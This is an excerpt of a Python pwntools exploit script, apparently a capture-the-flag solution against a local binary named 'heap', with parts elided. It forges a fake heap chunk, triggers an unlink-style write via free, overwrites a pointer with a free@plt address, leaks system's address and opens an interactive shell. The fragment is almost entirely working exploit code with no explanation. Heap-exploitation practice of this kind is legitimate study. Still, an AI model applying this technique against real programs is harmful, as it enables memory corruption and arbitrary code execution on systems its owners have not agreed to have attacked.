...
set_chunk(0,payload)
raw_input("[+]set fake chunk")
#get the pointer
raw_input("[*]seted fake chunk")
del_chunk(1)
raw_input("[+]free 1 chunk")
#pwnlib.gdb.attach(p)
raw_input("[-]wait")
set_chunk(0, 'A' * 2*4 + p32(chunk_list-0xc) + p32(0x8048420))   #p32(0x8048420) which addr is ok  free@plt
raw_input("[+]set chunk 0 ")
raw_input('leak')
#leak system_addr
pwn_elf = ELF('./heap')
...
raw_input("[+]set chunk 1")
del_chunk('3')
raw_input("[+]del chunk 3")
p.interactive()
p.close()
